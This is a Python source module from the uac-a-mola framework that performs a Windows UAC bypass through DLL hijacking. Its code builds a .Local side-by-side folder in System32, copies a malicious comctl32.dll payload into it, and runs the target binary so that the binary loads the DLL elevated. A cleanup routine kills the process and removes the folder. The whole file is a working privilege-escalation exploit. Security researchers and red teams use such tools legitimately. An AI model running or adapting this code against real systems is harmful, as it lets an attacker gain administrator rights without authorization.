# This file is part of uac-a-mola
# Copyright (C) Santiago Hernandez Ramos <shramos@protonmail.com>
#
# DESCRIPTION
# This module is used for dll hijacking of multiple binaries


from module import Module
from support.procmonXMLparser import ProcmonXmlParser
import support.procmonXMLfilter as Filter
import time
import subprocess
import psutil
import copy
from termcolor import colored


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DLL hijacking module",
                       "Description": "This module bypass UAC by dll hijacking",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description
        options = {"binary": [None, "Path to the vulnerable binary", True],
                   "malicious_dll": ["C:\Users\user\Desktop\uac-a-mola\uacamola\payloads\comctl32\comctl32.dll", "Path to a malicious dll", True],
                   "clean_path": [False, "This will just clean the path if exists without executing the dll hijacking!!", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        binary = self.args['binary']
        payload = self.args['malicious_dll']
        clean = self.args['clean_path']
        self.print_info("[*] Testing binary: %s...\n" % binary)
        subpath = "C:\\Windows\\System32\\%s.Local" % binary
        if clean == "True" or clean is True:
            self.clean_path(subpath, binary)
            self.print_ok("Path cleaned!\n")
            return
        self.handle_dll_local(subpath, binary, clean)

    def handle_dll_local(self, subpath, binary, clean):
        path = subpath + "\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.15063.0_none_583b8639f462029f\\"
        try:
            print "[+] Creating: " + path
            subprocess.check_call(
                ["powershell", "-C", "mkdir", path, ">", "$null"])
            print "[+] Copying the malicious dll to the path"
            subprocess.check_call(
                ["powershell", "-C", "cp", self.args["malicious_dll"], path])
            prev_pids = psutil.pids()
            print "[*] Executing the binary"
            subprocess.check_call(["powershell", "-C", binary])
        except subprocess.CalledProcessError as error:
            self.print_ko(str(error) + "\n")

    def clean_path(self, subpath, binary):
        print "[-] Deleting the path and cleaning up\n"
        for pid in psutil.pids():
            if binary in psutil.Process(pid).name():
                try:
                    print "Killing the process..."
                    subprocess.check_call(["taskkill", "/t", "/f", "/pid", str(pid)])
                except subprocess.CalledProcessError:
                    self.print_ko("[!!] The process %s can't be killed" % binary)
        subprocess.check_call(
            ["powershell", "-C", "rm", "-r", "-Force", subpath])
        
